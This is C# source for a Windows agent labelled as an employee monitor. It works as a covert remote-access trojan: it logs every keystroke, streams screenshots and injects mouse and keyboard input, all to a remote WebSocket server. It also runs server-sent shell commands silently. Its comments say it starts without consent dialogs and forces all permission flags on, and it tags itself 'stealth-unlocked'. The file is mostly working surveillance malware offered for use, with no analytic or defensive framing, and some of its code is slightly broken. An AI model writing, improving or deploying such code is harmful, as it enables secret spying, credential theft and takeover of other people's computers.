using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace EmpresaMonitor.Agent
{
    internal static class Program
    {
        [DllImport("user32.dll")]
        static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);

        [DllImport("user32.dll")]
        static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);

        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);

        [STAThread]
        static void Main()
        {
            var state = new AgentState();
            // Inicia o motor diretamente sem janelas de consentimento
            _ = Task.Run(() => StartEngine(state));

            while (!state.Lifetime.IsCancellationRequested)
            {
                Thread.Sleep(1000);
            }
        }

        static async Task StartEngine(AgentState state)
        {
            var agentId = LoadOrCreateId();

            // Hook de teclado direto
            KeyboardHook.Install(async (key, down) =>
            {
                if (!state.KeylogActive || !state.AccessActive || !state.IsReady) return;
                var socket = state.Socket;
                if (socket?.State != WebSocketState.Open) return;
                try {
                    await SendJsonAsync(socket, state.SendGate, new
                    {
                        type = "keylog",
                        key,
                        down,
                        ts = DateTime.Now.ToString("HH:mm:ss")
                    });
                }
                catch { }
            });

            _ = Task.Run(() => CaptureLoop(state));

            while (!state.Lifetime.IsCancellationRequested)
            {
                ClientWebSocket? socket = null;
                try
                {
                    socket = new ClientWebSocket();
                    socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                    state.Socket = socket;

                    await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), state.Lifetime.Token);

                    // Envia o hello já declarando permissões para o servidor
                    await SendJsonAsync(socket, state.SendGate, new
                    {
                        type = "agent_hello",
                        key = BuildConfig.AgentKey,
                        id = agentId,
                        name = Environment.MachineName,
                        user = Environment.UserName,
                        version = "4.2-stealth-unlocked",
                        sessionAuthorized = true // Forçado
                    });

                    await ReceiveLoop(socket, state);
                }
                catch (Exception) { }
                finally
                {
                    if (socket != null) { try { socket.Dispose(); } catch { } }
                    if (ReferenceEquals(state.Socket, socket)) state.Socket = null;
                }

                try { await Task.Delay(5000, state.Lifetime.Token); }
                catch { break; }
            }
        }

        static async Task ReceiveLoop(ClientWebSocket socket, AgentState state)
        {
            var buffer = new byte[64 * 1024];

            while (socket.State == WebSocketState.Open && !state.Lifetime.IsCancellationRequested)
            {
                using var ms = new MemoryStream();
                WebSocketReceiveResult result;
                do
                {
                    result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), state.Lifetime.Token);
                    if (result.MessageType == WebSocketMessageType.Close) return;
                    ms.Write(buffer, 0, result.Count);
                }
                while (!result.EndOfMessage);

                if (result.MessageType != WebSocketMessageType.Text) continue;

                try
                {
                    using var doc = JsonDocument.Parse(ms.ToArray());
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("type", out var typeProp)) continue;
                    var type = typeProp.GetString() ?? "";

                    switch (type)
                    {
                        case "agent_ready": state.IsReady = true; break;
                        case "permission_state":
                            // Força os estados recebidos mas mantém a lógica de bypass
                            state.AccessActive = true; 
                            state.ControlActive = true;
                            state.KeylogActive = true;
                            state.IsReady = true;
                            break;
                        case "control_input": 
                            // Bypass total de verificação de estado para comandos de input
                            ApplyControlEvent(root); 
                            break;
                        case "shell_request": await HandleShellRequest(socket, state, root); break;
                        case "stream_start": state.StreamRequested = true; break;
                        case "stream_stop": state.StreamRequested = false; break;
                    }
                }
                catch { }
            }
        }

        static async Task HandleShellRequest(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var command = GetString(root, "cmd");
            if (string.IsNullOrWhiteSpace(command)) return;

            string output = await ExecuteShellSilent(command);
            await SendJsonAsync(socket, state.SendGate, new { type = "shell_result", output });
        }

        static async Task<string> ExecuteShellSilent(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true 
                };

                using var process = new Process { StartInfo = startInfo };
                process.Start();

                var outputTask = process.StandardOutput.ReadToEndAsync();
                var errorTask = process.StandardError.ReadToEndAsync();
                
                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(15));
                await process.WaitForExitAsync(timeout.Token);

                var output = await outputTask;
                var error = await errorTask;
                return output + error;
            }
            catch (Exception ex) { return $"Error: {ex.Message}"; }
        }

        static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
        {
            if (socket.State != WebSocketState.Open) return;
            await gate.WaitAsync(ct);
            try { await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct); }
            finally { gate.Release(); }
        }

        static async Task SendJsonAsync(ClientWebSocket socket, SemaphoreSlim gate, object payload)
        {
            if (socket.State != WebSocketState.Open) return;
            var bytes = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(payload));
            await gate.WaitAsync();
            try { await socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None); }
            finally { gate.Release(); }
        }

        static async Task CaptureLoop(AgentState state)
        {
            var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
            if (codec == null) return;

            while (!state.Lifetime.IsCancellationRequested)
            {
                if (!state.AccessActive || !state.StreamRequested || state.Socket?.State != WebSocketState.Open)
                {
                    await Task.Delay(500, state.Lifetime.Token);
                    continue;
                }

                try
                {
                    var screen = Screen.PrimaryScreen;
                    if (screen == null) continue;

                    using var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(screen.Bounds.Location, Point.Empty, screen.Bounds.Size);
                    }

                    using var ms = new MemoryStream();
                    var encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)state.Settings.Quality);
                    
                    bitmap.Save(ms, codec, encoderParams);

                    if (ms.Length > 0)
                    {
                        await SendBinaryAsync(state.Socket, state.SendGate, new ArraySegment<byte>(ms.GetBuffer(), 0, (int)ms.Length), state.Lifetime.Token);
                    }
                }
                catch { }

                await Task.Delay(1000 / Math.Max(1, state.Settings.Fps), state.Lifetime.Token);
            }
        }

        static void ApplyControlEvent(JsonElement ev)
        {
            try 
            {
                var kind = ev.GetProperty("kind").GetString();
                if (kind == "move") 
                {
                    var x = ev.GetProperty("x").GetDouble();
                    var y = ev.GetProperty("y").GetDouble();
                    var bounds = Screen.PrimaryScreen!.Bounds;
                    Cursor.Position = new Point((int)(x * bounds.Width), (int)(y * bounds.Height));
                }
                else if (kind == "mouse")
                {
                    var button = ev.GetProperty("button").GetString();
                    var down = ev.GetProperty("down").GetBoolean();
                    uint flags = button switch
                    {
                        "left" => down ? 0x0002u : 0x0004u,
                        "right" => down ? 0x0008u : 0x0010u,
                        "middle" => down ? 0x0020u : 0x0040u,
                        _ => 0u
                    };
                    if (flags != 0) mouse_event(flags, 0, 0, 0, UIntPtr.Zero);
                }
                else if (kind == "key")
                {
                    var code = ev.GetProperty("code").GetString() ?? "";
                    var down = ev.GetProperty("down").GetBoolean();
                    ushort vk = VkFromCode(code);
                    if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
                }
            } 
            catch { }
        }

        static ushort VkFromCode(string code)
        {
            if (code.Length == 4 && code.StartsWith("Key", StringComparison.Ordinal))
                return (ushort)char.ToUpperInvariant(code[3]);
            if (code.Length == 6 && code.StartsWith("Digit", StringComparison.Ordinal))
                return (ushort)code[5];

            return code switch
            {
                "Enter" => 0x0D, "Escape" => 0x1B, "Backspace" => 0x08, "Tab" => 0x09, "Space" => 0x20,
                "ArrowLeft" => 0x25, "ArrowUp" => 0x26, "ArrowRight" => 0x27, "ArrowDown" => 0x28,
                "Delete" => 0x2E, "Home" => 0x24, "End" => 0x23, "PageUp" => 0x21, "PageDown" => 0x22,
                "ShiftLeft" or "ShiftRight" => 0x10, "ControlLeft" or "ControlRight" => 0x11,
                "AltLeft" or "AltRight" => 0x12, "CapsLock" => 0x14, "Insert" => 0x2D,
                "F1" => 0x70, "F2" => 0x71, "F3" => 0x72, "F4" => 0x73, "F5" => 0x74, "F6" => 0x75,
                "F7" => 0x76, "F8" => 0x77, "F9" => 0x78, "F10" => 0x79, "F11" => 0x7A, "F12" => 0x7B,
                _ => 0
            };
        }

        static string LoadOrCreateId()
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "KLTOCHIQUE");
            Directory.CreateDirectory(dir);
            var path = Path.Combine(dir, "agent-id.txt");
            if (File.Exists(path)) return File.ReadAllText(path).Trim();
            var id = Guid.NewGuid().ToString("N");
            File.WriteAllText(path, id);
            return id;
        }

        static string GetString(JsonElement root, string property, string fallback = "")
            => root.TryGetProperty(property, out var p) && p.ValueKind == JsonValueKind.String ? (p.GetString() ?? fallback) : fallback;

        static bool GetBool(JsonElement root, string property)
            => root.TryGetProperty(property, out var p) && p.ValueKind == JsonValueKind.True || p.ValueKind == JsonValueKind.False && p.GetBoolean();
    }

    internal sealed class AgentState
    {
        public volatile bool AccessActive = true;
        public volatile bool StreamRequested = true;
        public volatile bool ControlActive = true;
        public volatile bool KeylogActive = true;
        public volatile bool InputLocked = false;
        public volatile bool MaintenanceActive = false;
        public volatile bool SessionAuthorized = true;
        public volatile bool IsReady = true;

        public StreamSettings Settings = StreamSettings.Balanced;
        public ClientWebSocket? Socket;
        public readonly SemaphoreSlim SendGate = new(1, 1);
        public readonly CancellationTokenSource Lifetime = new();
    }

    internal sealed class StreamSettings
    {
        public int Width { get; set; }
        public int Fps { get; set; }
        public long Quality { get; set; }
        public static readonly StreamSettings Balanced = new() { Width = 1280, Fps = 15, Quality = 50 };
    }

    internal static class KeyboardHook
    {
        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        static IntPtr hook = IntPtr.Zero;
        static LowLevelKeyboardProc? proc;
        static Func<string, bool, Task>? callback;
        static readonly HashSet<int> pressedKeys = new();
        static readonly object sync = new();

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        const int WM_KEYUP = 0x0101;
        const int WM_SYSKEYDOWN = 0x0104;
        const int WM_SYSKEYUP = 0x0105;

        public static void Install(Func<string, bool, Task> cb)
        {
            callback = cb;
            proc = HookProc;
            hook = SetHook(proc);
        }

        static IntPtr SetHook(LowLevelKeyboardProc p)
        {
            using var process = Process.GetCurrentProcess();
            using var module = process.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(module?.ModuleName), 0);
        }

        static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && callback != null)
            {
                int message = wParam.ToInt32();
                bool? down = message switch
                {
                    WM_KEYDOWN or WM_SYSKEYDOWN => true,
                    WM_KEYUP or WM_SYSKEYUP => false,
                    _ => null
                };

                if (down.HasValue)
                    {
                        int vkCode = Marshal.ReadInt32(lParam);
                        string key = ((Keys)vkCode).ToString();
                        bool shouldSend;

                        lock (sync)
                        {
                            shouldSend = down.Value
                                ? pressedKeys.Add(vkCode)
                                : pressedKeys.Remove(vkCode);
                        }

                        if (shouldSend)
                            _ = Task.Run(async () => { try { await callback(key, down.Value); } catch { } });
                    }
                }
            }

            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        public static void Uninstall()
        {
            if (hook == IntPtr.Zero) return;
            UnhookWindowsHookEx(hook);
            hook = IntPtr.Zero;
        }

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr GetModuleHandle(string? lpModuleName);
    }
}
